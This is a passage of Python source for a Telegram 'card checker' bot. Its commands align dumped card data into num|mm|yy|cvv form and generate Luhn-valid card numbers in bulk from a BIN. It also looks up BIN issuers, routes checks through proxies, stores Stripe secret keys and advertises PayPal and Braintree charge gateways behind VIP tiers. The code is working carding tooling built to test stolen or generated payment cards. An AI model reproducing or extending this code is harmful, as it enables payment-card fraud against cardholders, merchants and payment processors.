@bot.message_handler(commands=["amadmin"])
def am_i_admin(message):
    """التحقق مما إذا كنت مشرفاً"""
    if message.from_user.id == admin:
        bot.reply_to(message, "<b>✅ أنت المشرف! يمكنك استخدام أوامر الإدارة.</b>")
    else:
        bot.reply_to(message, f"<b>❌ لست المشرف.\nمعرفك: {message.from_user.id}\nمعرف المشرف: {admin}</b>")

@bot.message_handler(commands=["thik"])
def thik_command(message):
    """Extract & align CCs from raw/messy text → num|mm|yy|cvv format."""
    text_body = ""
    src_label = ""

    replied = message.reply_to_message

    # ── Source 1: replied .txt file ───────────────────────────────
    if replied and replied.document and replied.document.file_name:
        fname = replied.document.file_name.lower()
        if fname.endswith('.txt'):
            wait_msg = bot.reply_to(message, "<b>⏳ File download ho rahi hai...</b>",
                                    parse_mode='HTML')
            try:
                file_info  = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                text_body  = downloaded.decode('utf-8', errors='ignore')
                src_label  = f"📄 {replied.document.file_name}"
            except Exception as e:
                bot.edit_message_text(
                    f"<b>❌ File download failed: {str(e)[:80]}</b>",
                    chat_id=message.chat.id,
                    message_id=wait_msg.message_id,
                    parse_mode='HTML')
                return
            bot.delete_message(message.chat.id, wait_msg.message_id)

    # ── Source 2: replied text/caption message ────────────────────
    if not text_body and replied:
        text_body = replied.text or replied.caption or ""

    # ── Source 3: inline text after command ───────────────────────
    if not text_body:
        parts = message.text.split(None, 1)
        if len(parts) > 1:
            text_body = parts[1]

    if not text_body.strip():
        bot.reply_to(
            message,
            "<b>ℹ️ /thik — CC Aligner\n\n"
            "Usage:\n"
            "• <code>/thik</code> — reply to a <b>.txt file</b> (any size)\n"
            "• <code>/thik</code> — reply to a message with raw CCs\n"
            "• <code>/thik [paste raw CCs here]</code>\n\n"
            "Supported formats:\n"
            "<code>4111111111111111 12 2026 123</code>\n"
            "<code>4111111111111111/12/26/123</code>\n"
            "<code>4111111111111111:12:26:123</code>\n"
            "<code>Live | 4111...|12|26|123 | Charge OK.</code>\n\n"
            "Output: <code>num|mm|yy|cvv</code></b>",
            parse_mode='HTML'
        )
        return

    lines = text_body.splitlines()
    found   = []
    skipped = 0
    seen    = set()

    for line in lines:
        line = line.strip()
        if not line:
            continue
        cc = _extract_cc(line)
        if cc and cc not in seen:
            found.append(cc)
            seen.add(cc)
        elif not cc:
            skipped += 1

    if not found:
        bot.reply_to(message,
            "<b>❌ Koi valid CC nahi mili.\n\n"
            "Check karo format sahi hai:\n"
            "<code>num|mm|yy|cvv</code> ya space/slash separated.</b>",
            parse_mode='HTML')
        return

    total   = len(found)
    # Telegram 4096 char limit — send in chunks if needed
    chunk_size = 200
    chunks     = [found[i:i+chunk_size] for i in range(0, total, chunk_size)]

    for idx, chunk in enumerate(chunks):
        header = (
            f"<b>✅ Aligned — {total} CC{'s' if total > 1 else ''}"
            + (f"  •  {skipped} skipped" if skipped else "")
            + (f"  •  Part {idx+1}/{len(chunks)}" if len(chunks) > 1 else "")
            + "</b>"
            + (f"\n<i>{src_label}</i>" if src_label else "")
            + "\n\n"
        )
        body = "<code>" + "\n".join(chunk) + "</code>"
        msg_text = header + body
        # Guard 4096 limit
        if len(msg_text) > 4090:
            msg_text = header + "<code>" + "\n".join(chunk[:100]) + "\n...</code>"
        if idx == 0:
            bot.reply_to(message, msg_text, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, msg_text, parse_mode='HTML')

@bot.message_handler(commands=["setproxy"])
def set_proxy_command(message):
    def my_function():
        id = message.from_user.id

        try:
            proxy_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            current = get_user_proxy(id)
            if current:
                bot.reply_to(message, f"<b>🌐 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗣𝗿𝗼𝘅𝘆: <code>{current}</code>\n\n𝗧𝗼 𝗰𝗵𝗮𝗻𝗴𝗲:\n/setproxy http://ip:port\n/setproxy socks5://ip:port\n/setproxy http://user:pass@ip:port\n\n𝗧𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:\n/setproxy off</b>")
            else:
                bot.reply_to(message, f"<b>🌐 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆 𝘀𝗲𝘁.\n\n𝗧𝗼 𝘀𝗲𝘁:\n/setproxy http://ip:port\n/setproxy socks5://ip:port\n/setproxy http://user:pass@ip:port\n\n𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱: HTTP, HTTPS, SOCKS4, SOCKS5</b>")
            return

        if proxy_input.lower() in ['off', 'none', 'remove', 'clear']:
            remove_user_proxy(id)
            bot.reply_to(message, "<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. 𝗨𝘀𝗶𝗻𝗴 𝗱𝗶𝗿𝗲𝗰𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗻𝗼𝘄.</b>")
            return

        proxy_input = parse_proxy(proxy_input)

        set_user_proxy(id, proxy_input)
        bot.reply_to(message, f"<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝘀𝗲𝘁 𝘁𝗼:\n<code>{proxy_input}</code>\n\n𝗔𝗹𝗹 𝗰𝗵𝗲𝗰𝗸𝘀 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗽𝗿𝗼𝘅𝘆.\n/setproxy off 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲.</b>")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["addproxy"])
def add_proxy_command(message):
    def my_function():
        id = message.from_user.id

        try:
            proxy_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message, "<b>🌐 𝗔𝗱𝗱 𝗣𝗿𝗼𝘅𝘆\n\n𝗨𝘀𝗮𝗴𝗲:\n/addproxy ip:port\n/addproxy user:pass@ip:port\n/addproxy http://ip:port\n/addproxy socks5://ip:port\n\n𝗦𝘂𝗽𝗽𝗼𝗿𝘁𝗲𝗱: HTTP, HTTPS, SOCKS4, SOCKS5</b>")
            return

        proxy_input = parse_proxy(proxy_input)

        set_user_proxy(id, proxy_input)
        bot.reply_to(message, f"<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n🌐 𝗣𝗿𝗼𝘅𝘆: <code>{proxy_input}</code>\n\n𝗔𝗹𝗹 𝗰𝗵𝗲𝗰𝗸𝘀 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗽𝗿𝗼𝘅𝘆.\n/removeproxy 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲\n/proxycheck 𝘁𝗼 𝘁𝗲𝘀𝘁</b>")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["removeproxy"])
def remove_proxy_command(message):
    def my_function():
        id = message.from_user.id
        current = get_user_proxy(id)

        if current:
            remove_user_proxy(id)
            bot.reply_to(message, "<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n🔗 𝗨𝘀𝗶𝗻𝗴 𝗱𝗶𝗿𝗲𝗰𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻 𝗻𝗼𝘄.\n/addproxy 𝘁𝗼 𝘀𝗲𝘁 𝗮 𝗻𝗲𝘄 𝗽𝗿𝗼𝘅𝘆.</b>")
        else:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆 𝘁𝗼 𝗿𝗲𝗺𝗼𝘃𝗲.\n\n/addproxy 𝘁𝗼 𝘀𝗲𝘁 𝗮 𝗽𝗿𝗼𝘅𝘆.</b>")

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["proxycheck"])
def proxy_check_command(message):
    def my_function():
        id = message.from_user.id
        current = get_user_proxy(id)

        if not current:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗽𝗿𝗼𝘅𝘆 𝘀𝗲𝘁.\n\n/addproxy 𝘁𝗼 𝘀𝗲𝘁 𝗮 𝗽𝗿𝗼𝘅𝘆.</b>")
            return

        msg = bot.reply_to(message, "<b>🔄 𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝘅𝘆... ⏳</b>")

        try:
            import requests as req
            proxy_dict = get_proxy_dict(id)
            start_time = time.time()
            r = req.get('https://api.ipify.org?format=json', proxies=proxy_dict, timeout=15)
            elapsed = round(time.time() - start_time, 2)
            ip_data = r.json()
            proxy_ip = ip_data.get('ip', 'Unknown')

            try:
                geo = req.get(f'http://ip-api.com/json/{proxy_ip}', timeout=10).json()
                country = geo.get('country', 'Unknown')
                city = geo.get('city', 'Unknown')
                isp = geo.get('isp', 'Unknown')
                geo_info = f"\n🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}\n🏙️ 𝗖𝗶𝘁𝘆: {city}\n🏢 𝗜𝗦𝗣: {isp}"
            except:
                geo_info = ""

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>✅ 𝗣𝗿𝗼𝘅𝘆 𝗶𝘀 𝗪𝗼𝗿𝗸𝗶𝗻𝗴!\n\n🌐 𝗣𝗿𝗼𝘅𝘆: <code>{current}</code>\n📡 𝗜𝗣: {proxy_ip}{geo_info}\n⏱️ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {elapsed}s</b>"
            )
        except req.exceptions.ProxyError:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>❌ 𝗣𝗿𝗼𝘅𝘆 𝗙𝗮𝗶𝗹𝗲𝗱!\n\n🌐 𝗣𝗿𝗼𝘅𝘆: <code>{current}</code>\n\n𝗘𝗿𝗿𝗼𝗿: 𝗖𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗰𝗼𝗻𝗻𝗲𝗰𝘁 𝘁𝗼 𝗽𝗿𝗼𝘅𝘆.\n𝗖𝗵𝗲𝗰𝗸 𝘆𝗼𝘂𝗿 𝗽𝗿𝗼𝘅𝘆 𝗮𝗻𝗱 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.</b>"
            )
        except req.exceptions.Timeout:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>⏰ 𝗣𝗿𝗼𝘅𝘆 𝗧𝗶𝗺𝗲𝗼𝘂𝘁!\n\n🌐 𝗣𝗿𝗼𝘅𝘆: <code>{current}</code>\n\n𝗘𝗿𝗿𝗼𝗿: 𝗣𝗿𝗼𝘅𝘆 𝘁𝗼𝗼𝗸 𝘁𝗼𝗼 𝗹𝗼𝗻𝗴 𝘁𝗼 𝗿𝗲𝘀𝗽𝗼𝗻𝗱.\n𝗧𝗿𝘆 𝗮 𝗳𝗮𝘀𝘁𝗲𝗿 𝗽𝗿𝗼𝘅𝘆.</b>"
            )
        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>❌ 𝗣𝗿𝗼𝘅𝘆 𝗘𝗿𝗿𝗼𝗿!\n\n🌐 𝗣𝗿𝗼𝘅𝘆: <code>{current}</code>\n\n𝗘𝗿𝗿𝗼𝗿: {str(e)[:100]}</b>"
            )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["setamount"])
def set_amount_command(message):
    def my_function():
        id = message.from_user.id
        
        try:
            amount = message.text.split(' ', 1)[1].strip()
            amount_float = float(amount)
            
            if amount_float < 0.01 or amount_float > 5.00:
                bot.reply_to(message, "<b>❌ 𝗔𝗺𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 $0.01 𝗮𝗻𝗱 $5.00</b>")
                return
            
            set_user_amount(id, f"{amount_float:.2f}")
            bot.reply_to(message, f"<b>✅ 𝗔𝗺𝗼𝘂𝗻𝘁 𝘀𝗲𝘁 𝘁𝗼: ${amount_float:.2f}</b>")
            
        except (IndexError, ValueError):
            current = get_user_amount(id)
            bot.reply_to(message, f"<b>📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current}\n\n𝗧𝗼 𝗰𝗵𝗮𝗻𝗴𝗲 𝘂𝘀𝗲:\n/setamount 0.50\n(𝗳𝗿𝗼𝗺 $0.01 𝘁𝗼 $5.00)</b>")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["setsk"])
def setsk_command(message):
    def my_function():
        id = message.from_user.id
        plan, _ = get_user_plan(id)
        if plan == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>🔒 𝗩𝗜𝗣 𝗼𝗻𝗹𝘆 𝗳𝗲𝗮𝘁𝘂𝗿𝗲\n\n𝗨𝗽𝗴𝗿𝗮𝗱𝗲 𝘁𝗼 𝗩𝗜𝗣 𝘁𝗼 𝘂𝘀𝗲 𝘆𝗼𝘂𝗿 𝗼𝘄𝗻 𝗦𝗞 𝗸𝗲𝘆.</b>", parse_mode='HTML')
            return
        try:
            sk = message.text.split(' ', 1)[1].strip()
        except IndexError:
            current = get_user_sk(id)
            status = f"<code>{current[:12]}...{'*' * 10}</code>" if current else "𝗡𝗼𝘁 𝗦𝗲𝘁"
            bot.reply_to(message,
                f"<b>🔑 𝗦𝗞 𝗞𝗲𝘆 𝗠𝗮𝗻𝗮𝗴𝗲𝗿\n\n"
                f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁: {status}\n\n"
                f"𝗧𝗼 𝘀𝗲𝘁 𝗸𝗲𝘆:\n<code>/setsk sk_live_xxxxxx</code>\n\n"
                f"𝗧𝗼 𝗿𝗲𝗺𝗼𝘃𝗲:\n<code>/delsk</code></b>",
                parse_mode='HTML'
            )
            return
        if not (sk.startswith('sk_live_') or sk.startswith('sk_test_')):
            bot.reply_to(message, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗦𝗞 𝗸𝗲𝘆 𝗳𝗼𝗿𝗺𝗮𝘁.\n\n𝗠𝘂𝘀𝘁 𝘀𝘁𝗮𝗿𝘁 𝘄𝗶𝘁𝗵 <code>sk_live_</code> 𝗼𝗿 <code>sk_test_</code></b>", parse_mode='HTML')
            return
        set_user_sk(id, sk)
        masked = f"{sk[:12]}...{'*' * 10}"
        bot.reply_to(message,
            f"<b>✅ 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗮𝘃𝗲𝗱!\n\n"
            f"🔑 𝗞𝗲𝘆: <code>{masked}</code>\n\n"
            f"ℹ️ 𝗬𝗼𝘂𝗿 /𝘀𝘁 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗦𝗞 𝗸𝗲𝘆 𝗶𝗻𝘀𝘁𝗲𝗮𝗱 𝗼𝗳 𝗱𝗲𝗳𝗮𝘂𝗹𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆.</b>",
            parse_mode='HTML'
        )
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["mysk"])
def mysk_command(message):
    def my_function():
        id = message.from_user.id
        sk = get_user_sk(id)
        if sk:
            masked = f"{sk[:12]}...{'*' * 10}"
            key_type = "🟢 𝗟𝗶𝘃𝗲" if sk.startswith('sk_live_') else "🟡 𝗧𝗲𝘀𝘁"
            bot.reply_to(message,
                f"<b>🔑 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗞𝗲𝘆\n\n"
                f"𝗞𝗲𝘆: <code>{masked}</code>\n"
                f"𝗧𝘆𝗽𝗲: {key_type}\n\n"
                f"𝗨𝘀𝗲𝗱 𝗶𝗻: /𝘀𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆\n\n"
                f"𝗧𝗼 𝗿𝗲𝗺𝗼𝘃𝗲: /𝗱𝗲𝗹𝘀𝗸</b>",
                parse_mode='HTML'
            )
        else:
            bot.reply_to(message,
                "<b>🔑 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗞𝗲𝘆\n\n❌ 𝗡𝗼 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗲𝘁.\n\n𝗨𝘀𝗲 /𝘀𝗲𝘁𝘀𝗸 𝘁𝗼 𝗮𝗱𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆.</b>",
                parse_mode='HTML'
            )
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["delsk"])
def delsk_command(message):
    def my_function():
        id = message.from_user.id
        sk = get_user_sk(id)
        if not sk:
            bot.reply_to(message, "<b>❌ 𝗡𝗼 𝗦𝗞 𝗸𝗲𝘆 𝘀𝗲𝘁.</b>", parse_mode='HTML')
            return
        delete_user_sk(id)
        bot.reply_to(message, "<b>✅ 𝗦𝗞 𝗸𝗲𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱. /𝘀𝘁 𝘄𝗶𝗹𝗹 𝗻𝗼𝘄 𝘂𝘀𝗲 𝗱𝗲𝗳𝗮𝘂𝗹𝘁 𝗴𝗮𝘁𝗲𝘄𝗮𝘆.</b>", parse_mode='HTML')
    threading.Thread(target=my_function).start()

@bot.message_handler(commands=["start"])
def start(message):
    def my_function():
        log_command(message, query_type='command')
        gate=''
        name = message.from_user.first_name
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        id=message.from_user.id
        
        try:BL=(json_data[str(id)]['plan'])
        except:
            BL='𝗙𝗥𝗘𝗘'
            with open("data.json", 'r', encoding='utf-8') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                str(id) : {
      "plan": "𝗙𝗥𝗘𝗘",
      "timer": "none",
                }
            }
    
            existing_data.update(new_data)
            with open("data.json", 'w', encoding='utf-8') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:        
            keyboard = types.InlineKeyboardMarkup()
            contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
            keyboard.add(contact_button)
            random_number = random.randint(33, 82)
            photo_url = f'https://t.me/bkddgfsa/{random_number}'
            bot.send_photo(
    chat_id=message.chat.id,
    photo=photo_url,
    caption=f'''<b>🌟 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌟

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『@yadistan』</b>
''', reply_markup=keyboard)
            return
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="YADISTAN", url="https://t.me/yadistan")
        keyboard.add(contact_button)
        username = message.from_user.first_name
        random_number = random.randint(33, 82)
        photo_url = f'https://t.me/bkddgfsa/{random_number}'
        bot.send_photo(chat_id=message.chat.id, photo=photo_url, caption='''𝗖𝗹𝗶𝗰𝗸 /cmds 𝗧𝗼 𝗩𝗶𝗲𝘄 𝗧𝗵𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗢𝗿 𝗦𝗲𝗻𝗱 𝗧𝗵𝗲 𝗙𝗶𝗹𝗲 𝗔𝗻𝗱 𝗜 𝗪𝗶𝗹𝗹 𝗖𝗵𝗲𝗰𝗸 𝗜𝘁''',reply_markup=keyboard)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["gen"])
def gen_command(message):
    def my_function():
        id = message.from_user.id

        try:
            args = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message,
                "<b>🃏 Card Generator\n\n"
                "Usage:\n"
                "  /gen BIN\n"
                "  /gen BIN amount\n\n"
                "Examples:\n"
                "  <code>/gen 411111</code> — 20 cards\n"
                "  <code>/gen 411111 100</code> — 100 cards (message)\n"
                "  <code>/gen 411111 1000</code> — 1000 cards (txt file)\n"
                "  <code>/gen 55442312xxxx|xx|xx|xxx 500</code>\n\n"
                "Default: 20 cards  •  No hard limit\n"
                "≤ 100 cards → message  •  > 100 → txt file</b>",
                parse_mode='HTML')
            return

        parts = args.split()
        bin_input = parts[0].strip()

        amount = 20
        if len(parts) > 1:
            try:
                amount = int(parts[1])
                if amount < 1:
                    amount = 1
                elif amount > 999999:
                    amount = 999999
            except ValueError:
                amount = 20

        bin_clean = bin_input.replace('x', '').replace('X', '')
        has_pipe = '|' in bin_input

        if has_pipe:
            card_parts = bin_input.split('|')
            bin_base = card_parts[0].strip()
            mm_template = card_parts[1].strip() if len(card_parts) > 1 else 'xx'
            yy_template = card_parts[2].strip() if len(card_parts) > 2 else 'xx'
            cvv_template = card_parts[3].strip() if len(card_parts) > 3 else 'xxx'
        else:
            bin_base = bin_clean
            mm_template = 'xx'
            yy_template = 'xx'
            cvv_template = 'xxx'

        if len(bin_base.replace('x','').replace('X','')) < 6:
            bot.reply_to(message, "<b>❌ 𝗕𝗜𝗡 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 6 𝗱𝗶𝗴𝗶𝘁𝘀.</b>")
            return

        def luhn_check(card_number):
            digits = [int(d) for d in card_number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0

        is_amex = bin_base[0] == '3'
        card_length = 15 if is_amex else 16
        cvv_length = 4 if is_amex else 3

        def generate_card():
            cc = ''
            for ch in bin_base:
                if ch.lower() == 'x':
                    cc += str(random.randint(0, 9))
                else:
                    cc += ch

            while len(cc) < card_length - 1:
                cc += str(random.randint(0, 9))

            for check_digit in range(10):
                test = cc + str(check_digit)
                if luhn_check(test):
                    cc = test
                    break

            if mm_template.lower() in ['xx', 'x', '']:
                mm = str(random.randint(1, 12)).zfill(2)
            else:
                mm = mm_template.zfill(2)

            current_year = datetime.now().year % 100
            if yy_template.lower() in ['xx', 'x', '']:
                yy = str(random.randint(current_year + 1, current_year + 5)).zfill(2)
            else:
                yy = yy_template.zfill(2)

            if cvv_template.lower() in ['xxx', 'xxxx', 'xx', 'x', '']:
                if is_amex:
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999)).zfill(3)
            else:
                cvv = cvv_template.zfill(cvv_length)

            return f"{cc}|{mm}|{yy}|{cvv}"

        cards = []
        seen = set()
        attempts = 0
        max_attempts = amount * 10
        while len(cards) < amount and attempts < max_attempts:
            card = generate_card()
            if card not in seen:
                seen.add(card)
                cards.append(card)
            attempts += 1

        bin_num = bin_base[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)

        total_gen = len(cards)
        header = (
            f"🃏 Card Generator\n\n"
            f"BIN: {bin_num}\n"
            f"Info: {bin_info}\n"
            f"Bank: {bank}\n"
            f"Country: {country} {country_code}\n"
            f"Amount: {total_gen} cards"
        )

        if amount > 100:
            # ── Send as .txt file ──────────────────────────────────
            import io
            file_content = '\n'.join(cards)
            file_bytes   = file_content.encode('utf-8')
            file_obj     = io.BytesIO(file_bytes)
            file_obj.name = f"gen_{bin_num}_{total_gen}.txt"
            bot.send_document(
                message.chat.id,
                file_obj,
                caption=f"<b>{header}</b>",
                parse_mode='HTML',
                reply_to_message_id=message.message_id
            )
        else:
            # ── Send as inline message ─────────────────────────────
            cards_text = '\n'.join([f"<code>{c}</code>" for c in cards])
            bot.reply_to(
                message,
                f"<b>{header}\n\n{cards_text}</b>",
                parse_mode='HTML'
            )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["bin"])
def bin_command(message):
    def my_function():
        id = message.from_user.id

        try:
            bin_input = message.text.split(' ', 1)[1].strip()
        except IndexError:
            bot.reply_to(message, "<b>🔍 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽\n\n𝗨𝘀𝗮𝗴𝗲:\n/bin 411111\n/bin 554423</b>")
            return

        bin_num = bin_input[:6]
        if len(bin_num) < 6 or not bin_num.isdigit():
            bot.reply_to(message, "<b>❌ 𝗕𝗜𝗡 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝘁 𝗹𝗲𝗮𝘀𝘁 6 𝗱𝗶𝗴𝗶𝘁𝘀.</b>")
            return

        msg = bot.reply_to(message, "<b>🔍 𝗟𝗼𝗼𝗸𝗶𝗻𝗴 𝘂𝗽 𝗕𝗜𝗡... ⏳</b>")

        try:
            url = "https://transfunnel.io/projects/chargeback/bin_check.php"
            payload = "{\"bin_number\":\""+str(bin_num)+"\"}"
            headers = {'User-Agent': str(generate_user_agent())}
            response = requests.post(url, data=payload, headers=headers)
            info = response.json()["results"]

            brand = info.get('cardBrand', 'Unknown')
            card_type = info.get('cardType', 'Unknown')
            card_cat = info.get('cardCat', 'Unknown')
            bank = info.get('issuingBank', 'Unknown')
            country = info.get('countryName', 'Unknown')
            country_code = info.get('countryA2', 'Unknown')
            country_emoji = info.get('countryFlag', '')

            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>🔍 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽\n\n𝗕𝗜𝗡: <code>{bin_num}</code>\n\n💳 𝗕𝗿𝗮𝗻𝗱: {brand}\n📋 𝗧𝘆𝗽𝗲: {card_type}\n🏷️ 𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆: {card_cat}\n🏦 𝗕𝗮𝗻𝗸: {bank}\n🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} [{country_code}] {country_emoji}</b>"
            )
        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=msg.message_id,
                text=f"<b>❌ 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗙𝗮𝗶𝗹𝗲𝗱\n\n𝗕𝗜𝗡: <code>{bin_num}</code>\n𝗘𝗿𝗿𝗼𝗿: {str(e)[:100]}</b>"
            )

    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["cmds", "help"])
def cmds_command(message):
    json_data = _load_data()
    id = message.from_user.id
    try:
        BL = json_data[str(id)]['plan']
    except Exception:
        BL = '𝗙𝗥𝗘𝗘'
    name = message.from_user.first_name
    current_amount = get_user_amount(id)
    is_vip = BL != '𝗙𝗥𝗘𝗘'

    lock     = "🔓" if is_vip else "🔒"
    vip_tag  = "╔[ ⭐ VIP MEMBER ]╗" if is_vip else "╔[ 🆓 FREE PLAN  ]╗"
    plan_btn = "⭐ VIP — Active" if is_vip else "⭐ VIP — Upgrade"

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton(text=f"📋 {plan_btn}", callback_data='plan'),
        types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan")
    )
    keyboard.add(
        types.InlineKeyboardButton(text="⚡ Ping Bot", callback_data='ping_inline'),
        types.InlineKeyboardButton(text="📊 My Stats", callback_data='stats_inline')
    )

    admin_section = ""
    if id == admin:
        admin_section = (
            "\n- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
            "🛡️ ──[ ADMIN PANEL ]── 🛡️\n"
            "  👑 /addvip    » Give VIP  <i>└ &lt;id|@user&gt; [days]</i>\n"
            "  🚫 /removevip » Revoke VIP  <i>└ &lt;id|@user&gt;</i>\n"
            "  🔍 /checkvip  » Check Plan  <i>└ &lt;id|@user&gt;</i>\n"
            "  📋 /viplist   » All VIP users  <i>└ DB + expiry status</i>\n"
            "  🔑 /code      » Gen VIP Key  <i>└ /code &lt;hours&gt;</i>\n"
            "  📊 /dbstats · 📤 /dbexport · 💾 /dbbackup · 🔎 /dbsearch\n"
            "  🖥️ /status  » Server status · IP · Location · Ping\n"
            "  📈 /stats   » Bot statistics · Gateway leaderboard\n"
            "  🔄 /restart » Restart bot service  <i>└ with confirmation</i>\n"
            "  🔌 /reboot  » Full EC2 reboot  <i>└ with confirmation</i>"
        )

    gw_msg = (
        "<b>╔━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\n"
        "    💀  ST-CHECKER-BOT  💀\n"
        "      Premium Card Checker\n"
        "╚━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\n"
        f"👤 User   : {name}\n"
        f"{vip_tag}\n"
        f"💵 Amount : ${current_amount}\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        "🔥 ──[ BASIC CHECKERS  🆓 FREE ]── 🔥\n"
        "  🔍 /chk  » Single Card Checker\n"
        "     <i>└ /chk 4111111111111111|12|25|123</i>\n"
        "  📦 /chkm » Mass Checker  <i>└ up to 50 · reply to .txt</i>\n"
        "- ‐ - ‐ - ‐ - ‐ - ‐ - ‐ - ‐ -\n"
        f"💳 ──[ PAYMENT GATEWAYS  {lock} VIP ]── 💳\n"
        f"  💰 /pp   » PayPal  <i>└ charge ${current_amount}</i>\n"
        "  🛡️ /vbv  » Braintree 3DS Single  <i>└ $2.99 auth</i>\n"
